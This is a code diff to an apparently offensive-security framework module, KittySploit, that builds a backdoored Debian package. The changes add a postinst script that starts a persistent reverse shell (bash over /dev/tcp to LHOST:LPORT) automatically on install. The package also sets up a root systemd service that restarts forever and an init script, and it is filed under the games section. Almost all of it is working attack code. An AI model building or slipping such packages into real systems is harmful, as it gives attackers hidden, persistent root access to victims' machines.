@@ -1,7 +1,14 @@
 from kittysploit import *
 import os
-import tarfile
+import shutil
 from pathlib import Path
+
+from lib.compile.deb_evasion_helpers import (
+    create_ar_archive,
+    create_control_tar,
+    create_data_tar,
+)
+
 
 class Module(Backdoor):
     
@@ -17,134 +24,66 @@ class Module(Backdoor):
 
     package_name = OptString("xlibd", "Package name", True)
     version = OptString("1.6", "Package version", True)
-    
 
-    def create_ar_archive(self, output_filename, *files):
-        """
-        Create an ar archive from the given files.
-        """
-        def pad(name):
-            return name + ' ' * (16 - len(name))
-
-        def write_ar_file(archive, filename, data):
-            archive.write(b'!<arch>\n')  # ar archive magic number
-            for name, content in data.items():
-                archive.write(pad(name).encode('utf-8'))
-                archive.write(b'0           ')  # timestamp
-                archive.write(b'0     ')  # owner id
-                archive.write(b'0     ')  # group id
-                archive.write(b'100644  ')  # file mode
-                archive.write(f'{len(content):<10}'.encode('utf-8'))  # file size
-                archive.write(b'`\n')  # file magic number
-                archive.write(content)
-                if len(content) % 2 != 0:
-                    archive.write(b'\n')  # ar files are 2-byte aligned
-
-        file_data = {}
-        for file in files:
-            with open(file, 'rb') as f:
-                file_data[Path(file).name] = f.read()
-
-        with open(output_filename, 'wb') as archive:
-            write_ar_file(archive, output_filename, file_data)
-
-    def create_control_tar(self, control_content, output_filename):
-        """
-        Create a control.tar.gz file with the given control content.
-        """
-        control_file_path = "control"
-        with open(control_file_path, 'w') as f:
-            f.write(control_content)
-
-        with tarfile.open(output_filename, "w:gz") as tar:
-            tar.add(control_file_path, arcname='control')
-
-        os.remove(control_file_path)
-
-    def create_data_tar(self, source_dir, output_filename):
-        """
-        Create a data.tar.gz file from the given directory.
-        """
-        with tarfile.open(output_filename, "w:gz") as tar:
-            for root, _, files in os.walk(source_dir):
-                for file in files:
-                    file_path = os.path.join(root, file)
-                    arcname = os.path.relpath(file_path, source_dir)
-                    tar.add(file_path, arcname=arcname)
-
-    def _cleanup_temp_files(self, output_dir, package_dir, data_dir):
-        """Clean up temporary files and directories used for building the .deb"""
-        try:
-            import shutil
-            
-            # Clean up build directory
-            if package_dir.exists():
-                shutil.rmtree(package_dir)
-                print_success(f"Cleaned up build directory: {package_dir}")
-            
-            # Clean up data directory (payload files)
-            if data_dir.exists():
-                shutil.rmtree(data_dir)
-                print_success(f"Cleaned up data directory: {data_dir}")
-            
-            # Clean up any temporary control files
-            temp_control = Path("control")
-            if temp_control.exists():
-                temp_control.unlink()
-                print_success(f"Cleaned up temporary control file")
-            
-            print_success(f"Cleanup completed - only .deb package remains in output directory")
-            
-        except Exception as e:
-            print_warning(f"Cleanup failed: {e}")
-            print_warning(f"You may need to manually clean up temporary files")
-
-    def run(self):
-        try:
-            print_success(f"Creating Debian package: {self.package_name} v{self.version}")
-            print_success(f"Backdoor target: {self.lhost}:{self.lport}")
-            
-            # Ensure output directory exists
-            output_dir = Path("output")
-            output_dir.mkdir(parents=True, exist_ok=True)
-            
-            # Create project directory structure
-            project_name = f"{self.package_name}_{self.version}_all"
-            data_dir = output_dir / project_name
-            data_dir.mkdir(parents=True, exist_ok=True)
-            
-            # Create subdirectories
-            (data_dir / "usr" / "bin").mkdir(parents=True, exist_ok=True)
-            (data_dir / "usr" / "lib" / "systemd" / "system").mkdir(parents=True, exist_ok=True)
-            (data_dir / "etc" / "init.d").mkdir(parents=True, exist_ok=True)
-            (data_dir / "var" / "log").mkdir(parents=True, exist_ok=True)
-            
-            # Create payload files using inherited create_file method
-            reverse_shell_payload = f"""#!/bin/bash
-# Reverse shell payload for {self.lhost}:{self.lport}
-bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
+    def _build_postinst(self) -> str:
+        pkg = self.package_name
+        return f"""#!/bin/bash
+set -e
+# Trigger callback after package files are on disk (dpkg configure phase).
+if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
+    systemctl daemon-reload || true
+    systemctl enable {pkg}.service >/dev/null 2>&1 || true
+    systemctl start {pkg}.service >/dev/null 2>&1 || true
+fi
+if ! pgrep -f '/usr/bin/{pkg}_persistent.sh' >/dev/null 2>&1; then
+    nohup /usr/bin/{pkg}_persistent.sh >/dev/null 2>&1 &
+fi
+exit 0
 """
-            
-            persistent_payload = f"""#!/bin/bash
+
+    def _build_prerm(self) -> str:
+        pkg = self.package_name
+        return f"""#!/bin/bash
+set -e
+if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
+    systemctl stop {pkg}.service >/dev/null 2>&1 || true
+    systemctl disable {pkg}.service >/dev/null 2>&1 || true
+fi
+pkill -f '/usr/bin/{pkg}_persistent.sh' >/dev/null 2>&1 || true
+pkill -f '/usr/bin/{pkg}.sh' >/dev/null 2>&1 || true
+exit 0
+"""
+
+    def _write_payload_tree(self, data_dir: Path) -> None:
+        reverse_shell_payload = f"""#!/bin/bash
+# Reverse shell payload for {self.lhost}:{self.lport}
+bash >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
+"""
+
+        persistent_payload = f"""#!/bin/bash
 # Persistent backdoor for {self.lhost}:{self.lport}
 while true; do
-    bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
+    bash >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
     sleep 30
 done
 """
-            
-            # Create payload scripts
-            self.create_file(str(data_dir / "usr" / "bin" / f"{self.package_name}.sh"), reverse_shell_payload)
-            self.create_file(str(data_dir / "usr" / "bin" / f"{self.package_name}_persistent.sh"), persistent_payload)
-            
-            # Create systemd service
-            systemd_service = f"""[Unit]
+
+        bin_dir = data_dir / "usr" / "bin"
+        bin_dir.mkdir(parents=True, exist_ok=True)
+        sh_main = bin_dir / f"{self.package_name}.sh"
+        sh_persist = bin_dir / f"{self.package_name}_persistent.sh"
+        sh_main.write_text(reverse_shell_payload, encoding="utf-8")
+        sh_persist.write_text(persistent_payload, encoding="utf-8")
+        os.chmod(sh_main, 0o755)
+        os.chmod(sh_persist, 0o755)
+
+        systemd_service = f"""[Unit]
 Description=KittySploit Backdoor Service
 After=network.target
 
 [Service]
 Type=simple
-ExecStart=/usr/bin/{self.package_name}.sh
+ExecStart=/usr/bin/{self.package_name}_persistent.sh
 Restart=always
 RestartSec=5
 User=root
@@ -152,11 +91,11 @@ User=root
 [Install]
 WantedBy=multi-user.target
 """
-            
-            self.create_file(str(data_dir / "usr" / "lib" / "systemd" / "system" / f"{self.package_name}.service"), systemd_service)
-            
-            # Create init script
-            init_script = f"""#!/bin/bash
+        systemd_dir = data_dir / "usr" / "lib" / "systemd" / "system"
+        systemd_dir.mkdir(parents=True, exist_ok=True)
+        (systemd_dir / f"{self.package_name}.service").write_text(systemd_service, encoding="utf-8")
+
+        init_script = f"""#!/bin/bash
 ### BEGIN INIT INFO
 # Provides:          {self.package_name}
 # Required-Start:    $local_fs $network
@@ -195,11 +134,15 @@ case "$1" in
         ;;
 esac
 """
-            
-            self.create_file(str(data_dir / "etc" / "init.d" / self.package_name), init_script)
-            
-            # Create README
-            readme_content = f"""# {self.package_name} - KittySploit Package
+        init_dir = data_dir / "etc" / "init.d"
+        init_dir.mkdir(parents=True, exist_ok=True)
+        init_path = init_dir / self.package_name
+        init_path.write_text(init_script, encoding="utf-8")
+        os.chmod(init_path, 0o755)
+
+        (data_dir / "var" / "log").mkdir(parents=True, exist_ok=True)
+        (data_dir / "README.md").write_text(
+            f"""# {self.package_name} - KittySploit Package
 
 This package contains a backdoor payload for penetration testing purposes.
 
@@ -209,7 +152,8 @@ sudo dpkg -i {self.package_name}_{self.version}_all.deb
 ```
 
 ## Usage
-The backdoor will connect to {self.lhost}:{self.lport} when executed.
+On `dpkg -i`, the postinst script starts a persistent reverse shell to {self.lhost}:{self.lport}.
+You can also run manually: `/usr/bin/{self.package_name}_persistent.sh`
 
 ## Files installed:
 - /usr/bin/{self.package_name}.sh - Main backdoor script
@@ -221,14 +165,33 @@ The backdoor will connect to {self.lhost}:{self.lport} when executed.
 ```bash
 sudo dpkg -r {self.package_name}
 ```
-"""
-            
-            self.create_file(str(data_dir / "README.md"), readme_content)
-            
-            # Create control file
+""",
+            encoding="utf-8",
+        )
+
+    def run(self):
+        try:
+            print_success(f"Creating Debian package: {self.package_name} v{self.version}")
+            print_success(f"Backdoor target: {self.lhost}:{self.lport}")
+            if str(self.lhost).strip() in ("127.0.0.1", "localhost", "::1"):
+                print_warning(
+                    "LHOST is loopback — the payload connects to 127.0.0.1 on the TARGET host. "
+                    "For a remote callback, re-run with: set LHOST <your_kittysploit_ip>"
+                )
+            print_info("postinst will auto-start the persistent payload on dpkg -i / dpkg --configure")
+
+            output_dir = Path(self.output_dir_path("backdoors/linux/deb"))
+            output_dir.mkdir(parents=True, exist_ok=True)
+
+            data_dir = output_dir / f"{self.package_name}_{self.version}_data"
+            if data_dir.exists():
+                shutil.rmtree(data_dir)
+            data_dir.mkdir(parents=True)
+            self._write_payload_tree(data_dir)
+
             control = f"""Package: {self.package_name}
 Version: {self.version}
-Section: Games and Amusement
+Section: games
 Priority: optional
 Architecture: all
 Maintainer: KittySploit Team <team@kittysploit.com>
@@ -237,35 +200,45 @@ Description: KittySploit Backdoor Package
  The backdoor will connect to {self.lhost}:{self.lport} when executed.
  Use responsibly and only on systems you own or have permission to test.
 """
-            
-            # Create package directory for building
-            package_dir = output_dir / f"{self.package_name}_{self.version}_build"
-            package_dir.mkdir(parents=True, exist_ok=True)
-            
-            # Create debian-binary file
-            self.create_file(str(package_dir / "debian-binary"), "2.0\n")
-            
-            # Create control.tar.gz file
-            control_tar_path = package_dir / "control.tar.gz"
-            self.create_control_tar(control, control_tar_path)
-            
-            # Create data.tar.gz file
-            data_tar_path = package_dir / "data.tar.gz"
-            self.create_data_tar(str(data_dir), data_tar_path)
-            
-            # Create .deb package using pure Python
+
+            build_dir = output_dir / f"{self.package_name}_{self.version}_build"
+            if build_dir.exists():
+                shutil.rmtree(build_dir)
+            build_dir.mkdir(parents=True)
+
+            (build_dir / "debian-binary").write_text("2.0\n", encoding="utf-8")
+
+            control_tar_path = build_dir / "control.tar.gz"
+            create_control_tar(
+                control,
+                control_tar_path,
+                scripts={
+                    "postinst": self._build_postinst(),
+                    "prerm": self._build_prerm(),
+                },
+            )
+
+            data_tar_path = build_dir / "data.tar.gz"
+            create_data_tar(data_dir, data_tar_path)
+
             deb_file_path = output_dir / f"{self.package_name}_{self.version}_all.deb"
-            self.create_ar_archive(deb_file_path, package_dir / "debian-binary", control_tar_path, data_tar_path)
-            
-            print_success(f"Debian package created successfully!")
+            create_ar_archive(
+                deb_file_path,
+                build_dir / "debian-binary",
+                control_tar_path,
+                data_tar_path,
+            )
+
+            shutil.rmtree(build_dir, ignore_errors=True)
+            shutil.rmtree(data_dir, ignore_errors=True)
+
+            print_success("Debian package created successfully!")
             print_success(f"Package: {deb_file_path.name}")
             print_success(f"Location: {deb_file_path.absolute()}")
             print_success(f"Payload: Reverse shell to {self.lhost}:{self.lport}")
             print_success(f"Output directory: {output_dir.absolute()}")
-            
-            # Clean up temporary files and directories
-            self._cleanup_temp_files(output_dir, package_dir, data_dir)
-                        
+            return True
+
         except Exception as e:
             print_error(f"deb_packaging failed: {e}")
             import traceback
